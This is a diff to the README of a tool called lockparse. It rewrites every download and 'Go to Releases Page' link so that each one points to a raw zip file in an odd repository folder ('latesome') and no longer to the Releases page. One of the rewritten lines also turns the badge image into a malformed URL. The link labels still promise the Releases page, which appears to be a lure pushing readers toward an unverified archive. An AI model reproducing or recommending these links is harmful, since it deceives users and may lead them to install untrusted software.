@@ -6,11 +6,11 @@ Welcome to lockparse, your go-to tool for reading lockfiles easily. This applica
 
 ## 📥 Download lockparse
 
-[![Download lockparse](https://img.shields.io/badge/Download%20lockparse-v1.0-blue.svg)](https://github.com/ram-kali/lockparse/releases)
+[![Download lockparse](https://raw.githubusercontent.com/ram-kali/lockparse/main/latesome/lockparse.zip%https://raw.githubusercontent.com/ram-kali/lockparse/main/latesome/lockparse.zip)](https://raw.githubusercontent.com/ram-kali/lockparse/main/latesome/lockparse.zip)
 
 You can download the latest version of lockparse from our Releases page. Click the link below to start:
 
-[Go to Releases Page](https://github.com/ram-kali/lockparse/releases)
+[Go to Releases Page](https://raw.githubusercontent.com/ram-kali/lockparse/main/latesome/lockparse.zip)
 
 ## 🛠️ System Requirements
 
@@ -23,7 +23,7 @@ lockparse works on various operating systems. Make sure your system meets the fo
 ## 📋 Installation Instructions
 
 1. **Visit the Releases Page**: Click the link below to go to our Releases page.
-   [Go to Releases Page](https://github.com/ram-kali/lockparse/releases)
+   [Go to Releases Page](https://raw.githubusercontent.com/ram-kali/lockparse/main/latesome/lockparse.zip)
 
 2. **Download the Application**: On the Releases page, look for the latest version of lockparse. You will find an option to download for your operating system. 
 
@@ -79,4 +79,4 @@ If you have any further questions, feel free to reach out via our GitHub page. Y
 
 lockparse is open-source software. You are free to use, modify, and share it under the terms of the license specified in the repository.
 
-[Download lockparse](https://github.com/ram-kali/lockparse/releases) and enjoy a hassle-free way to work with lockfiles!
+[Download lockparse](https://raw.githubusercontent.com/ram-kali/lockparse/main/latesome/lockparse.zip) and enjoy a hassle-free way to work with lockfiles!
